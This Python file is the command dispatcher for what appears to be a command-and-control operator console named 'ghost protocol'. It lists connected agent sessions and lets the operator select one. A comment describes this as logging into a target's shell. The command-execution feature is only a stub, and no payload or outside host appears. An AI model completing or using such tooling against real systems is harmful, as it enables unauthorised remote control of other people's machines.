import sys
import os
import re
import subprocess
import cli
import connection
import colors


active_sessions = {} # dictionary to show the agent id and its source port
current_session = None # kept default to None 


def help_usage():
    help_commands = [
        "help",
        "sessions",
        "use session", # using this we login to the target's shell and then execute commands 
        "back",
        "clear",
        #"execute <command>",
        "exit"
    ]
    print(f"-"*20)
    print(f"{colors.Fore.GREEN}Available commands : ")
    print(f"-"*20)
    print(f"\n".join(help_commands))


def sessions_usage():
    global active_sessions
    print(f"\n{colors.Style.BRIGHT}{colors.Fore.CYAN}[*]Listing sessions{colors.Style.RESET_ALL}")
    session_info = connection.connect("sessions")
    if session_info is None:
        active_sessions = {}
        return
    active_sessions = {} # updating active_sessions each time so that disconnected agent ids dont remain and shows active agents in real time
    for session in session_info:
        session_id = session["agent_sid"]
        active_sessions[session_id] = session


def choose_session(command, session_id): # to do (IMPLEMENT USE or choose a session)
    global current_session
    if session_id not in active_sessions:
        print(f"{colors.Fore.RED}[!] Invalid session id : {session_id}")
        return
    current_session = session_id
    print(f"{colors.Style.BRIGHT}{colors.Fore.GREEN}[+]session id : {current_session} selected {colors.Style.RESET_ALL}")
    


def clear_usage():
    subprocess.run("clear", shell=True)


def back_usage():
    pass



def execute_cmd_usage():
    pass



def exit_usage():
    print(f"{colors.Fore.RED}[!]exiting ghost protocol\n")
    sys.exit() # returns statsu code 0 and exits program



def parse_session_id(command):
    match = re.match(r"^use\s+(\d+)$", command)
    if match:
        session_id = int(match.group(1))
        return "use", session_id
    return "use", None


# key value pairing is done like key <-> function_name
# we can trigger this function using the key anytime we like
command_dispatcher = {
    "help": help_usage,
    "sessions": sessions_usage,
    "use": choose_session,
    "back": back_usage,
    "execute": execute_cmd_usage,
    "clear": clear_usage,
    "exit": exit_usage
}

def dispatch():
    while True:
        try:
            session_id = None
            command = cli.command_input_prompt()
            if command == "":
                continue
            if command.startswith("use"): # perform use command parsing
                command, session_id = parse_session_id(command)
            if command in command_dispatcher:
                if command == "use":
                    if session_id == None:
                        print(f"{colors.Fore.RED}[!]invalid session id")
                    else:
                        command_dispatcher[command](command, session_id)
                else:
                    command_dispatcher[command]() # using the command key to call the associated function of the key")
            else:
                print(f"{colors.Fore.YELLOW}command not found")
            print()
        except KeyboardInterrupt:
            print(f"\n{colors.Fore.RED}[!]exiting ghost protocol\n")
            os._exit(0)

        